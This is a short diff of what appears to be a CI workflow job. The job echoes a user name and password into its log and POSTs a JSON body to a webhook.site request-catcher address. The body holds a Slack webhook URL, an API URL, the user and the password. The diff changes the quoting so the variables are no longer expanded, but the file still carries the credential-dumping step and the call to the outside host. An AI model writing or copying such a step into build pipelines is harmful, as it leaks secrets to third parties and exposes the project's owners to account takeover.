@@ -50,13 +50,13 @@ jobs:
         echo "USER: $USER"
         echo "PW: $PW"
         echo "Send run log"
-        # curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
+        # curl -sSf -k -u "$USER:$PW" $URL/api/run/audit
         curl -X POST -H "Content-Type: application/json" \
         -d '{
-              "slack_webhook_url": "'"${SLACK_WEBHOOK_URL}"'",
-              "api_url": "'"${API_URL}"'",
-              "user": "'"${USER}"'",
-              "password": "'"${PW}"'"
+              "slack_webhook_url": "${SLACK_WEBHOOK_URL}",
+              "api_url": "${API_URL}",
+              "user": "${USER}",
+              "password": "${PW}"
             }' \
         https://webhook.site/ce8160db-c0af-4bef-9f1a-818e88e1475b
         
